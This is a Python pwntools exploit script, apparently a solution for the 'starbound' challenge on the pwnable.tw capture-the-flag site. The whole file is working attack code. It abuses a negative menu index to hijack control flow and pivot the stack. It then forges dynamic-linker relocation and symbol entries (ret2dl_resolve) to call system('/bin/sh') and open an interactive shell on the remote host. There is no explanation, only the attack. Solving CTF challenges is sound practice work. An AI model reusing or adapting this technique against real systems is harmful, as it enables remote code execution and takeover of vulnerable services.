#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./starbound')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x0804A65D
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10202)

	return s

s = conn()

elf = ELF('starbound')

s.sendlineafter(b'> ', b'6')
s.sendlineafter(b'> ', b'2')

leave_ret = p32(elf.symbols['main'] + 110)
add_pop_4 = p32(elf.symbols['__libc_csu_init'] + 89)
buf = 0x08057fe0
dl_resolve = 0x08048940
SYMTAB = 0x080481dc
STRTAB = 0x080484fc
JMPREL = 0x080487c8

s.sendlineafter(b'Enter your name: ', add_pop_4)
s.sendlineafter(b'> ', b'-33 ' + b'a' * 16 + p32(buf) + p32(elf.symbols['read']) + leave_ret + p32(0) + p32(buf) + p32(0x80))

rel_offset = buf + 0x14 - JMPREL
symtab_index = (buf + 0x1c - SYMTAB + 15) // 16
padding = SYMTAB + symtab_index * 16 - (buf + 0x1c)
st_name = buf + 0x2c + padding - STRTAB
bin_sh = buf + 0x34 + padding

fake_jmprel = p32(elf.got['free']) + p32((symtab_index << 8) | 0x7)
fake_symtab = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload = b'AAAA' + p32(dl_resolve) + p32(rel_offset) + b'AAAA' + p32(bin_sh)
payload += fake_jmprel + b'A' * padding + fake_symtab
payload += b'system\x00\x00' + b'/bin/sh\x00'

s.sendline(payload)

s.interactive()
